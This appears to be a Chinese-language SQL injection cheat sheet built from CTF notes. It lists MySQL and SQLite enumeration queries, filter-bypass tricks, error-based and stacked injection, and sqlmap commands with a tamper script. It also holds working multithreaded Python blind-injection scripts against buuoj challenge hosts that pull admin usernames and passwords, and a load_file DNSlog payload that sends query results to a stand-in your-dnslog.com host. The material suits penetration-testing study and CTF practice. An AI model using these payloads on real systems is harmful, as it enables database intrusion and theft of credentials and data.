# SQli

常规方法利用information\_schema

```sql
#爆库
select database()
#爆表
select group_concat(table_name) from information_schema.tables where table_schema=<database name>
#爆字段
select group_concat(column_name) from information_schema.columns where table_name=<table name>
#爆数据
select group_concat(<column name>) from <table name>
```

mysql &gt; 5.6 版本 利用sys库

```sql
# 爆表
# schema_auto_increment_columns

select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

# schema_table_statistics_with_buffer

select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
```

mysql &gt; 5.5 利用`innodb_table_stats`

```sql
# 爆表
select group_concat(table_name) from mysql.innodb_table_stats
```

## 技巧

* 加`()、/**/` bypass`空格`

* `like` bypass `=`

* 利用双hex(保证纯数字字符)注入
  ``'%2B(select hex(hex(database())))%2B'0``

* `select .` bypass 一般是堆叠注入

  * 利用show

  * 利用set prepare

    ```sql
    @t=(sql 查询语句的hex值);prepare x from @t;execute x;#
    ```

    bypass进行堆叠注入

    ```python
    python
    >>> import binascii
    >>> binascii.b2a_hex("select * from supersqli.1919810931114514")
    '73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134'
    ```

  * 利用handler(MySQL)
    语法结构
    ```sql
    HANDLER tbl_name OPEN [ [AS] alias]

    HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ { FIRST | NEXT }
        [ WHERE where_condition ] [LIMIT ... ]

    HANDLER tbl_name CLOSE
    ```
    Example:
    ```sql
    handler <tablename> open as <handlername>; #指定数据表进行载入并将返回句柄重命名
    handler <handlername> read first; #读取指定表/句柄的首行数据
    handler <handlername> read next; #读取指定表/句柄的下一行数据
    ...
    handler <handlername> close; #关闭句柄
    ```

* 看回显点

  ```sql
  select 1,2,3,....
  ```

* 注释符

  * ``/**/``
  * ``\# -> %23``

  * ``--`` 

* ``order by``看字段数 先看看有几个回显点也可以用``group by``

  ```sql
  1' order by 3#
  ->

  1' order by 4#
  ->
  Error
  ```

* ``union`` 联合注入

* ``limit``

  ```sql
  limit i,n
  # tableName：表名
  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
  # n：为查询结果返回的数量
  # i与n之间使用英文逗号","隔开
  ```

* 报错注入

  * `updatexml(1,concat(1,(<SQLi>)),1)`
  * `extractvalue(1,concat(1,<SQli>))`

* 无列名注入  
  考虑这样的表格，使用select 1,2,3,4,5 union select \* from persons可以得到一张新的表格

  ```
  MariaDB [test]> select * from persons;
  +------+----------+-----------+--------------+--------+
  | ID   | LastName | FirstName | Address      | Credit |
  +------+----------+-----------+--------------+--------+
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    2 | Xill     | Hiler     | Like 10      | 100.67 |
  |    2 | Eki      | Hiler     | Nanfen 10    | 100.67 |
  +------+----------+-----------+--------------+--------+

  ->

  MariaDB [test]> select 1,2,3,4,5 union select * from persons;
  +------+-------+-------+--------------+--------+
  | 1    | 2     | 3     | 4            | 5      |
  +------+-------+-------+--------------+--------+
  |    1 | 2     | 3     | 4            |      5 |
  |    1 | Gates | Bill  | Xuanwumen 10 |   NULL |
  |    2 | Xill  | Hiler | Like 10      | 100.67 |
  |    2 | Eki   | Hiler | Nanfen 10    | 100.67 |
  +------+-------+-------+--------------+--------+
  ```

  然后就可以套娃拿数据了,注意`a`这个别名\(任意内容\)是必须的（新生成的表）

      MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a;          
      +-------+
      | 2     |
      +-------+
      | 2     |
      | Gates |
      | Xill  |
      | Eki   |
      +-------+

  或者也可以将数字换成别名 在反引号不可用的情况下

  ```
  MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a;
  +-------+
  | b     |
  +-------+
  | 2     |
  | Gates |
  | Xill  |
  | Eki   |
  +-------+
  ```

* 布尔盲注

  * 利用`if() ,like,or,>,=,<`

    ```python
    #coding=utf-8
    import requests
    import urllib

    url="http://6074ac45-6b22-49a0-ae5a-38c5940e1c1e.node3.buuoj.cn/image.php"
    #sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())" Result:admin,contents
    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')" Result:id,username,password,is_enqble
    #sql="select(group_concat(username))from(admin)" Result:a4341216,aebc38b6
    #sql="select(group_concat(password))from(admin)" Result:0c9bb00f,8a9b3d5a
    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')" Result:id,title,content,is_gnable
    #sql="select(group_concat(content))from(contents)"
    sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
    ret=''

    for i in range(1,50):
      l=1
      r=255
      while(l+1<r):
          mid=(l+r)/2
          payload="if((ascii(substr(("+sql+"),"+str(i)+",1)))>"+str(mid)+",1,0)"
          #print payload
          param={"id":payload}
          #print chr(mid)
          req=requests.get(url,params=param).text
          print req
          if (len(req)>10):
              l=mid
          else :
              r=mid
      ret=ret+chr(r)
      print "Result:"+ret
    ```

  * 利用0^1^0 并采取多线程

```python
#coding=utf-8
import requests
import threading
url="http://d23fcdc7-5653-43bc-802e-afeb7d6efea4.node3.buuoj.cn/search.php?id="

#sql="select(group_concat(username))from(admin)" 
#sql="select(group_concat(password))from(admin)"
#sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
#sql="select(group_concat(content))from(contents)"
#sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
#Result:F1naI1y,Flaaaaag
sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
#Result:id,username,password
sql="select(group_concat(password))from(F1naI1y)"
#sql="select(group_concat(password))from(users)"
ret=''
def booltest(start,end):
    ret=""
    for i in range(start,end):
        l=1
        r=255
        while(l+1<r):
            mid=(l+r)/2
            payload="0^((ascii(substr(({0}),{1},1)))>{2})^0".format(sql,i,mid)
            #payload="union select * from images where id=if(1>0,1,0)#"
            #print payload
            param = {
                "id":payload,
            }
            #print chr(mid)
            req=requests.get(url,params=param)
            if (req.status_code != requests.codes.ok):
                continue
            #print req.text
            if (len(req.text)>720):
                l=mid
            else :
                r=mid
        ret=ret+chr(r)
        print(threading.current_thread().name+"working:"+ret) 
    print(threading.current_thread().name+ret)


thr1 = threading.Thread(target=booltest, args=(1, 4),name="1")
thr2 = threading.Thread(target=booltest, args=(4, 8),name="2")
thr3 = threading.Thread(target=booltest, args=(8, 12),name="3")
thr4 = threading.Thread(target=booltest, args=(12, 16),name="4")
thr5 = threading.Thread(target=booltest, args=(16, 20), name="5")
thr6 = threading.Thread(target=booltest, args=(20, 24), name="6")
thr7 = threading.Thread(target=booltest, args=(24, 28), name="7")

thr1.start()
thr2.start()
thr3.start()
thr4.start()
thr5.start()
thr6.start()
thr7.start()
```
  * 时间盲注

    和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据
    
    利用``SLEEP(n)``
    
    绕过
    ```sql
    benchmark(1000000,sha(1))
    ```

    参考资料：https://www.anquanke.com/post/id/170626

  * 修改 ``||``(或)运算符为字符串连接符
    ``set sql_mode=PIPES_AS_CONCAT;`` 
  
  * substr被过滤
    
    ```sql
    left(str,index) //从左边第index开始读取
    right(str,index) //从右边index开始读取
    mid(str,index,len)//从index开始截取str,截取len的长度
    substring(strd,index) //从左边index开始读取
    lpad(str, padded_length, [ pad_str ] )//在str左填充给定的pad_str到指定的长度len,返回len个字符
    rpad(str, padded_length, [ pad_str ] )//在str右填充给定的pad_str到指定的长度len,返回len个字符
    ```
  * ascii被过滤

    ``hex() ord() bin()``
  
  * load_file dnslog注入
    
    poc:
    ```
    select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
    ```
  * 空格绕过
    
    mysql查询的时候将会忽略字符串尾部的空格
  
  * 格式化字符串逃逸
    https://zhuanlan.zhihu.com/p/115777073 

  * order by 盲注
    
    1. 利用不同的order by 返回的结果盲注 类似 bool盲注

    https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/

    2. 利用 order by的特性进行盲注

      ```
      MariaDB [test]> select * from users union select 1,2,3 order by 3;
      +----+----------+----------+
      | Id | username | password |
      +----+----------+----------+
      |  1 | 2        | 3        |
      |  1 | admin    | admin    |
      |  2 | eki      | test123  |
      +----+----------+----------+
      3 rows in set (0.001 sec)

      MariaDB [test]> select * from users union select 1,2,'~' order by 3;
      +----+----------+----------+
      | Id | username | password |
      +----+----------+----------+
      |  1 | admin    | admin    |
      |  2 | eki      | test123  |
      |  1 | 2        | ~        |
      +----+----------+----------+
      ```
    *  select * from users2 where 1 group by password with rollup having password is NULL;
    
    3. 利用 with rollup 的特性构造字段 NULL 绕过验证
       ```
        MariaDB [test]> select * from users2 where 1 group by 1 with rollup;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  1 | eki      | test123  | 233   |
        |  2 | admin    | admin    | 233   |
        | NULL | admin    | admin    | 233   |
        +----+----------+----------+-------+
        MariaDB [test]> select * from users2 where 1 group by 2 with rollup;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  2 | admin    | admin    | 233   |
        |  1 | eki      | test123  | 233   |
        |  1 | NULL     | test123  | 233   |
        +----+----------+----------+-------+
        MariaDB [test]> select * from users2 where 1 group by password with rollup having password is NULL;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  1 | eki      | NULL     | 233   |
        +----+----------+----------+-------+
      ```
## 关于Sqlite

sqlite每个db文件就是一个数据库，不存在``information_schema``数据库，但存在类似作用的表``sqlite_master``。

该表记录了该库下的所有表，索引，表的创建sql

```sql
select group_concat(name) from sqlite_master where type='table'  #读取表名
select group_concat(sql) from sqlite_master where type='table' and name='<table name>' #读取字段
```

``OR EXISTS({0} LIKE \"{1}%\" limit 1).format(sql,tmp)`` #匹配以{1}开头的数据

在sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 ``-9223372036854775808 (0x8000000000000000)`` 就会报错，同样如果是正数也会报错

与mysql不同 sqlite中十六进制会被转换为十进制

所以sqlite中字符串无法使用十六进制绕过

但是仍可以使用函数绕过，但因不存在mysql中ord,ascii等，sqlite中应该使用char与hex

```sql
select * from sqlite_master where type=char(0x74,0x61,0x62,0x6c,0x65);
select * from sqlite_master where type='table';
```

bypass if

```sql
select case (1) when 1 then 2 else 0
select ifnull(nullif(1,2),3) 
```

>ifnull(X,Y)
>
>The ifnull() function returns a copy of its first non-NULL argument, or NULL if both arguments are NULL. Ifnull() must have exactly 2 arguments. The ifnull() function is equivalent to coalesce() with two arguments.
>
>nullif(X,Y)
>
>The nullif(X,Y) function returns its first argument if the arguments are different and NULL if the arguments are the same. The nullif(X,Y) function searches its arguments from left to right for an argument that defines a collating function and uses that collating function for all string comparisons. If neither argument to nullif() defines a collating function then the BINARY is used.


## SQLMAP

基本流程

POST存个post报文``test``然后``-p``注入的参数

```
sqlmap -r test.txt -p id
```

直接用url GET这样写

```
sqlmap -u http://xxx.xxx/?id=1 -p id
```

``--batch``使用默认设置

一些常用的命令

```
sqlmap -u url --dbs //爆数据库
sqlmap -u url --current-db //爆当前库
sqlmap -u url --current-user //爆当前用户
sqlmap -u url --users查看用户权限
sqlmap -u url --tables -D数据库 //爆表段
sqlmap -u url --columns -T表段 -D 数据库 //爆字段
sqlmap -u url --dump -C字段 -T 表段 -D 数据库 //猜解
sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解1到3的字段
```

写一个简单的temper

```python
# sqlmap/tamper/backquotes.py
 
from lib.core.enums import PRIORITY
 
__priority__ = PRIORITY.LOWEST
 
def dependencies():
    pass
 
def tamper(payload, **kwargs):
    return "1`,"+payload+")#"
```


## 参考资料

对MYSQL注入相关内容及部分Trick的归类小结

[https://xz.aliyun.com/t/7169](https://xz.aliyun.com/t/7169)

sqlite 全函数查询

https://www.sqlite.org/lang_corefunc.html